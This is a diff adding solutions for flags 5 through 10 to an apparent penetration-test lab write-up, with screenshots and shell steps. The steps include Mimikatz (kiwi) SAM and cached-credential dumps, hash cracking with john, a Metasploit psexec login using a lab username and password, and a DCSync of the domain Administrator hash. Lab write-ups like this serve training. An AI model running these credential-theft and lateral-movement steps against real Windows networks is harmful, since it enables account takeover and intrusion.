@@ -426,42 +426,100 @@ cat flag4.txt
 
 ### Flag 5: 
 
-
+![image](https://github.com/user-attachments/assets/789a220f-ceb2-431f-ac46-3f8a8a6f5019)
+</br>
 ```shell
+shell
 
+schtasks /query /TN flag5 /FO list /v
+
+54fa8cd5c1354adc9214969d716673f5
 ```
 
 ### Flag 6: 
 
-
+![image](https://github.com/user-attachments/assets/947aeb32-04af-4070-977f-f8c4aeb606ba)
+</br>
 ```shell
+load kiwi
 
+lsa_dump_sam
+
+john hash.txt
+
+Computer!
 ```
 
 ### Flag 7: 
 
-
+![image](https://github.com/user-attachments/assets/75c3fa78-fe12-4e25-a9bd-423ab0a13e1f)
+</br>
 ```shell
+shell
 
+cd c:\Users\Public\Documents
+
+type flag7.txt
+
+6fd73e3a2c2740328d57ef32557c2fdc
 ```
 
 ### Flag 8: 
 
-
+![image](https://github.com/user-attachments/assets/26b7e12d-4e2b-41f4-8e63-6202fca00ec0)
+![image](https://github.com/user-attachments/assets/41409440-0f9b-4037-a048-571f1491943c)
+![image](https://github.com/user-attachments/assets/d72a6353-acdc-4ebc-97a9-6310edcdced3)
+</br>
 ```shell
+load kiwi
 
-```
+kiwi_cmd lsadump::cache
 
-### Flag 9: 
+msfconsole
 
+use exploit/windows/smb/psexec
 
-```shell
+set rhosts 172.22.117.10
 
+set smbuser ADMBob
+
+set smbpass Changeme!
+
+setsmbdomain rekall
+
+set lhost 172.22.117.100
+
+run
+
+shell
+
+net users
+
+ad12fc2ffc1
 ```
 
 ### Flag 10: 
 
-
+![image](https://github.com/user-attachments/assets/d1b85bc9-324c-45eb-b3ce-202a40dcee36)
+</br>
 ```shell
+load kiwi
 
+dcsync_ntlm Administrator
+
+4f0cfd309a1965906fd2ec39dd23d582
+```
+
+## Lateral Movement
+
+### Flag 9: 
+
+![image](https://github.com/user-attachments/assets/c667201d-0390-4e22-9b46-a149ad68cf82)
+</br>
+```shell
+cd C:\
+
+type flag9.txt
+
+f7356e02f44c4fe7bf5374ff9bcbf872
 ```
